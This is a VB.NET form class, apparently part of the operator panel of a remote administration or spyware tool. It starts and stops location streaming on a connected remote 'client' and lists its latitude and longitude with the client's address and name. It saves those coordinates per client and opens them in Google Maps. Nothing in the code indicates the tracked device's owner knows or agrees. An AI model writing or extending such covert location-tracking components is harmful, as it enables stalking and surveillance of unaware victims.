﻿Imports System.ComponentModel

Public Class Location_Manager
    Dim imageList_0 As New ImageList()
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String

    Sub Client_data(ByVal data As String)
        Try
            If data IsNot Nothing Then


                If data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]") Then
                    Dim spl_Exception() As String = {"[My/Exception]"}
                    Dim p() As String = data.Split(spl_Exception, StringSplitOptions.RemoveEmptyEntries)
                    Label1.Text = p(0)
                    If Panel3.Visible = False Then Panel3.Visible = True
                Else

                    Dim Save_data As System.Text.StringBuilder = New System.Text.StringBuilder()
                    'DataGridView1.Rows.Clear()
                    Dim split_Ary() As String = {Form1.s.split_Ary}
                    Dim Ary() As String = data.Split(split_Ary, StringSplitOptions.RemoveEmptyEntries)

                    Dim index_image As Integer = 0
                    index_image = imageList_0.Images.IndexOfKey("location".ToUpper)

                    DataGridView1.Rows.Add(imageList_0.Images(index_image), Ary(0), Ary(1), Ary(2))
                    Save_data.AppendFormat("{0}", Ary(0) + " , " + Ary(1) + " , " + Ary(2) + vbNewLine)
                    store_0.Save_0(Name_Client & Client_ID & "\" & "Location_Manager", Save_data.ToString)

                    ToEnd()
                    If Panel3.Visible = True Then Panel3.Visible = False
                    refres_title()

                End If

            End If
        Catch ex As Exception

            'MsgBox(ex.ToString)
        End Try
    End Sub

    Private Sub ToEnd()
        Me.DataGridView1.FirstDisplayedScrollingRowIndex = Me.DataGridView1.RowCount - 1
        Me.DataGridView1.CurrentCell = Nothing
        Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Selected = True
    End Sub
    Private Sub Location_Manager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ListenerStopToolStripMenuItem.Image = store_0.Bitmap_0("ctx_lstnStop")
        ListenerStartToolStripMenuItem.Image = store_0.Bitmap_0("ctx_lstnPlay")
        ChromeToolStripMenuItem.Image = store_0.Bitmap_0("ctx_maps")
        FirefoxToolStripMenuItem.Image = store_0.Bitmap_0("ctx_maps")
        DefaultToolStripMenuItem.Image = store_0.Bitmap_0("ctx_maps")
        ContextMenuStrip1.Renderer = New Theme_0
#Region " imageList Location "
        Dim b As Boolean = False
        Dim List_Files As String() = IO.Directory.GetFiles(Application.StartupPath & "\" & store_0.name_folder_app_resource & "\icons\location_manager\")
        Dim i As String
        For Each i In List_Files
            If b = False Then
                Me.icon_0.Width = Bitmap.FromFile(i).Size.Width
                imageList_0.ImageSize = New Size(Bitmap.FromFile(i).Size.Width, Bitmap.FromFile(i).Size.Height)
                imageList_0.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit
                b = True
            End If
            Dim FilePath As String = i
            Dim directoryPath As String = IO.Path.GetFileNameWithoutExtension(FilePath)
            imageList_0.Images.Add(directoryPath.ToUpper, Bitmap.FromFile(i))
        Next
#End Region

        refres_title()
        Me.Icon = store_0.icons_0("window")
    End Sub
    Private Sub refres_title()
        Dim title As String = String.Format("Location Manager" + " - Remote Address & Port: {0} Client Name: {1} - Item: {2} Item Selection: {3}", Client_remote_Address, Name_Client, CStr(DataGridView1.Rows.Count), CStr(DataGridView1.SelectedRows.Count))
        Text = title
    End Sub

    Private Sub ListenerStopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ListenerStopToolStripMenuItem.Click
        Form1.s.Send(handle_Number_Client, "location_manager_stop")

    End Sub

    Private Sub ListenerStartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ListenerStartToolStripMenuItem.Click
        Form1.s.Send(handle_Number_Client, "location_manager")
    End Sub


    Private Sub Browsers(Browser As String)
        Try
            If DataGridView1.SelectedRows.Count > 0 Then



                For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                        Dim Latitude As String = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Value ' Latitude
                        Dim Longitude As String = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Value ' Longitude
                    Dim rn As String = "https://www.google.com/maps/dir/" + Latitude + "," + Longitude + "/@" + Latitude + "," + Longitude + ",16.01z"
                    If Browser = "default" Then
                        Process.Start(rn)
                    Else
                        System.Diagnostics.Process.Start(Browser, rn)
                    End If



                Next

            End If
        Catch ex As Exception

        End Try

    End Sub
    Private Sub DataGridView1_CellContentClick(sender As Object, e As DataGridViewCellEventArgs) Handles DataGridView1.CellContentClick

    End Sub

    Private Sub ChromeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChromeToolStripMenuItem.Click
        Browsers("chrome.exe")
    End Sub

    Private Sub FirefoxToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FirefoxToolStripMenuItem.Click
        Browsers("firefox.exe")
    End Sub

    Private Sub Location_Manager_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Form1.s.Send(handle_Number_Client, "location_manager_stop")
    End Sub

    Private Sub DefaultToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DefaultToolStripMenuItem.Click

        Browsers("default")
    End Sub
End Class